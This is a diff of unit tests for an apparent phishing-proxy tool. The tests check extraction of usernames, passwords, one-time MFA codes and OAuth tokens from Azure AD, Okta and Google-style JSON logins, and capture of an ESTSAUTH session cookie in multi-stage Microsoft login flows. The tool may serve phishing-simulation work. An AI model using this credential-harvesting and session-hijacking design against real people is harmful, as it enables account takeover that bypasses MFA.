@@ -8,6 +8,7 @@ from unittest.mock import patch, MagicMock
 from bluephishproxy.crypto import encrypt, decrypt
 from bluephishproxy.proxy import (
     extract_credentials,
+    extract_credentials_json,
     encrypt_credentials,
     encrypt_session_data,
     extract_session_tokens,
@@ -104,6 +105,109 @@ class TestExtractCredentials:
         u, p, found = extract_credentials(form)
         assert u == "admin"
         assert p == "pass"
+
+
+# --- JSON credential extraction tests ------------------------------------
+
+class TestExtractCredentialsJson:
+    def test_azure_ad_login(self):
+        body = json.dumps({
+            "login": "user@contoso.com",
+            "loginFmt": "user@contoso.com",
+            "passwd": "P@ssw0rd!",
+            "ctx": "rQQIAR...",
+            "flowToken": "AQA...",
+        }).encode()
+        u, p, raw, found = extract_credentials_json(body)
+        assert found
+        assert u == "user@contoso.com"
+        assert p == "P@ssw0rd!"
+
+    def test_azure_get_credential_type(self):
+        body = json.dumps({
+            "username": "user@contoso.com",
+            "isOtherIdpSupported": True,
+            "checkPhones": False,
+        }).encode()
+        u, p, raw, found = extract_credentials_json(body)
+        assert found
+        assert u == "user@contoso.com"
+        assert p == ""
+
+    def test_okta_authn(self):
+        body = json.dumps({
+            "username": "admin@corp.com",
+            "password": "Secret123",
+            "options": {"multiOptionalFactorEnroll": False},
+        }).encode()
+        u, p, raw, found = extract_credentials_json(body)
+        assert found
+        assert u == "admin@corp.com"
+        assert p == "Secret123"
+
+    def test_nested_credentials(self):
+        body = json.dumps({
+            "auth": {
+                "credentials": {
+                    "username": "nested@user.com",
+                    "password": "deep_secret",
+                }
+            }
+        }).encode()
+        u, p, raw, found = extract_credentials_json(body)
+        assert found
+        assert u == "nested@user.com"
+        assert p == "deep_secret"
+
+    def test_google_style_email(self):
+        body = json.dumps({
+            "Email": "victim@gmail.com",
+            "Passwd": "",
+            "continue": "https://mail.google.com",
+        }).encode()
+        u, p, raw, found = extract_credentials_json(body)
+        assert found
+        assert u == "victim@gmail.com"
+
+    def test_google_style_password_stage(self):
+        body = json.dumps({
+            "Passwd": "hunter2",
+            "continue": "https://mail.google.com",
+        }).encode()
+        u, p, raw, found = extract_credentials_json(body)
+        assert found
+        assert p == "hunter2"
+
+    def test_no_credentials_in_json(self):
+        body = json.dumps({
+            "action": "redirect",
+            "target": "/dashboard",
+        }).encode()
+        u, p, raw, found = extract_credentials_json(body)
+        assert not found
+
+    def test_invalid_json(self):
+        u, p, raw, found = extract_credentials_json(b"not json at all")
+        assert not found
+        assert u == ""
+
+    def test_mfa_code_captured(self):
+        body = json.dumps({
+            "otpCode": "482901",
+            "stateToken": "abc...",
+        }).encode()
+        u, p, raw, found = extract_credentials_json(body)
+        assert found
+        assert p == "482901"
+
+    def test_oauth_token_captured(self):
+        body = json.dumps({
+            "accessToken": "eyJhbGciOiJSUzI1NiIs...",
+            "tokenType": "Bearer",
+        }).encode()
+        u, p, raw, found = extract_credentials_json(body)
+        assert found
+        assert "eyJ" in p
 
 
 # --- Credential encryption tests -----------------------------------------
@@ -371,6 +475,87 @@ class TestProxyRoutes:
 
         sessions = list_captured_sessions(cfg, campaign_id=campaign["id"])
         assert len(sessions) >= 1
+
+    @patch("bluephishproxy.proxy.http_client.request")
+    def test_proxy_json_post_captures_credentials(self, mock_req, client, cfg, campaign):
+        campaign["target_url"] = "https://login.microsoftonline.com"
+        from bluephishproxy.database import save_campaign_db
+        save_campaign_db(campaign, cfg)
+
+        results = import_recipients(cfg, campaign["id"], [
+            {"email": "azure@corp.com"},
+        ])
+        token = results[0]["token"]
+
+        mock_resp = MagicMock()
+        mock_resp.status_code = 200
+        mock_resp.headers = {"Content-Type": "application/json"}
+        mock_resp.content = b'{"FlowToken": "abc"}'
+        mock_resp.cookies = {}
+        mock_req.return_value = mock_resp
+
+        resp = client.post(
+            f"/t/{token}/common/login",
+            data=json.dumps({
+                "login": "victim@contoso.com",
+                "passwd": "AzureP@ss!",
+                "ctx": "rQQI...",
+            }),
+            content_type="application/json",
+        )
+
+        creds = list_credentials(cfg, campaign_id=campaign["id"])
+        assert len(creds) >= 1
+
+    @patch("bluephishproxy.proxy.http_client.request")
+    def test_multi_stage_login(self, mock_req, client, cfg, campaign):
+        campaign["target_url"] = "https://login.microsoftonline.com"
+        from bluephishproxy.database import save_campaign_db
+        save_campaign_db(campaign, cfg)
+
+        results = import_recipients(cfg, campaign["id"], [
+            {"email": "multistage@corp.com"},
+        ])
+        token = results[0]["token"]
+
+        mock_resp = MagicMock()
+        mock_resp.status_code = 200
+        mock_resp.headers = {"Content-Type": "application/json"}
+        mock_resp.content = b'{"FlowToken": "stage1"}'
+        mock_resp.cookies = {}
+        mock_req.return_value = mock_resp
+
+        client.post(
+            f"/t/{token}/common/GetCredentialType",
+            data=json.dumps({"username": "staged@contoso.com"}),
+            content_type="application/json",
+        )
+
+        creds_stage1 = list_credentials(cfg, campaign_id=campaign["id"])
+        assert len(creds_stage1) >= 1
+
+        mock_resp2 = MagicMock()
+        mock_resp2.status_code = 302
+        mock_resp2.headers = {
+            "Location": "https://login.microsoftonline.com/done",
+            "Set-Cookie": "ESTSAUTH=tokenvalue1234567890abc; Path=/; Secure",
+        }
+        mock_resp2.content = b""
+        mock_resp2.cookies = {"ESTSAUTH": "tokenvalue1234567890abc"}
+        mock_req.return_value = mock_resp2
+
+        client.post(
+            f"/t/{token}/common/login",
+            data=json.dumps({"passwd": "StageTwo!"}),
+            content_type="application/json",
+        )
+
+        creds_stage2 = list_credentials(cfg, campaign_id=campaign["id"])
+        assert len(creds_stage2) >= 2
+
+        latest = creds_stage2[0]
+        assert latest["username_enc"]
+        assert latest["password_enc"]
 
     @patch("bluephishproxy.proxy.http_client.request")
     def test_proxy_502_on_target_error(self, mock_req, client, cfg, campaign):
